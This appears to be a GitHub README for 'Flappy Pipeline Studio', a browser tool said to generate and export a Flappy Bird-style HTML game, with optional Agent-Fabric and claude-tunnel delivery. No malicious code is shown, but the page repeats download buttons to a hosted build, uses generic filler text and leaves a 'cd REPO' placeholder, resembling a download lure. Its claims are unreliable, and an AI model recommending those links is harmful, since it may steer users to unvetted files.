# Flappy Pipeline Studio - Web Game Generator 2026

> **Flappy Pipeline Studio is a browser-based HTML game generator for customizing and exporting a Flappy Bird-style game, with a client-side workflow and optional pipeline delivery through Agent-Fabric, claude-tunnel, and Caddy.**

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Current-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/seanadamskvzx8448/flappy-pipeline-studio-web?style=flat-square)](https://github.com/seanadamskvzx8448/flappy-pipeline-studio-web)

---

<p align="center">
  <a href="https://seanadamskvzx8448.github.io/flappy-pipeline-studio-web/">
    <img src="https://img.shields.io/badge/Download-Flappy%20Pipeline%20Studio%20Latest-brightgreen?style=for-the-badge" alt="Download Flappy Pipeline Studio">
  </a>
</p>

> **[Download Flappy Pipeline Studio](https://seanadamskvzx8448.github.io/flappy-pipeline-studio-web/)**

---

[Download Latest Build](https://seanadamskvzx8448.github.io/flappy-pipeline-studio-web/)

---

## What is Flappy Pipeline Studio?

Flappy Pipeline Studio lets you design a customized Flappy Bird-style game from a web browser. Its template-based HTML generator exposes controls for the bird's appearance, the overall visual theme, and gameplay physics, making it suitable for experiments, demos, and small game prototypes that can be shared.

Alongside the browser generator, the project demonstrates a role-chain pipeline operating over an Agent-Fabric channel. A generated game may be delivered through an HTTPS tunnel using claude-tunnel and Caddy, and the pipeline lifecycle can be switched on or off as needed. Each export is a standalone HTML file that can run separately from the generator.

---

## Highlights

- Personalize the bird, visual styling, and physics parameters.
- Export a complete game as a downloadable standalone HTML file.
- Generate output in the browser using HTML templates.
- Showcase a role-chain pipeline built around Agent-Fabric.
- Make the web experience available through an HTTPS tunnel.
- Control whether the pipeline lifecycle is active.
- Work entirely through a browser-focused flow without a separate game engine.
- Establish a base for future LLM-agent pipeline generation.

---

## Getting Started

### Download the source

```bash
git clone https://github.com/seanadamskvzx8448/flappy-pipeline-studio-web.git
cd REPO
```

The basic local workflow does not need package installation because the project is HTML-based. You can open its primary HTML entry point in a browser, or serve the repository with a lightweight static server:

```bash
python3 -m http.server 8000
```

Open the local site at:

```text
http://localhost:8000/
```

To use the hosted version, select [Download Latest Build](https://seanadamskvzx8448.github.io/flappy-pipeline-studio-web/).

---

## Using the Generator

1. Launch Flappy Pipeline Studio in a current web browser.
2. Pick the bird design and game theme.
3. Set the available physics parameters.
4. Ask the client-side template to generate the game.
5. Download the produced standalone HTML document.
6. Open the file on your computer or publish it through a web server.
7. For the pipeline demonstration, activate the required lifecycle and set up HTTPS delivery with the supported Agent-Fabric, claude-tunnel, and Caddy workflow.

Because the export is self-contained, you can share the generated HTML game without also distributing the generator interface.

---

## Settings and Deployment

The main generator is operated through the browser UI. Select the bird, theme, and physics values there before creating the HTML output.

Pipeline behavior is determined by the deployment workflow. If you are using that portion of the project, inspect the local pipeline and tunnel configuration for:

- Whether the lifecycle is enabled or disabled.
- Agent-Fabric role-chain configuration.
- claude-tunnel connection settings.
- Caddy HTTPS delivery configuration.

Deployment-specific values should remain in the configuration for your environment and should not be placed inside exported game files.

---

## Requirements

- A modern browser with JavaScript enabled.
- A local web server for development and testing.
- Python 3 or another static HTTP server for local hosting.
- Network connectivity for hosted delivery or tunnel-based operation.
- Caddy and claude-tunnel for the HTTPS pipeline demonstration.
- Agent-Fabric access for the role-chain workflow.
- Enough storage for the repository and generated HTML exports.

---

## Frequently Asked Questions

### Is the pipeline required to generate a game?

No. You can customize and export an HTML game with the client-side generator without using the pipeline delivery workflow.

### What form does the export take?

The generator produces a standalone HTML file. Use the browser download process or the project interface to save it locally.

### Are gameplay settings customizable?

The available physics controls change how the generated game behaves. The specific settings depend on the current template and browser interface.

### What is the local development procedure?

Clone the repository, run a static server such as `python3 -m http.server 8000`, and open the local URL shown by the server in your browser.

### What should I check if the hosted page fails to display?

First confirm that JavaScript is turned on. Serving the project through a local HTTP server is also preferable to opening its files directly. If you are using tunnel delivery, check the claude-tunnel and Caddy settings as well.

### Where can I find updates?

New versions may be made available through the repository and its hosted build. Visit the project page to check the newest version and generated assets.

### Does the project currently generate games with LLM agents?

LLM-agent pipeline generation remains planned. The current implementation centers on the browser-based generator and the role-chain pipeline demonstration.

---

## Planned Work

- Broaden LLM-agent pipeline generation.
- Introduce more ways to customize exported games.
- Polish controls for the role-chain pipeline.
- Improve hosted HTTPS delivery procedures.
- Expand configuration and export documentation.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
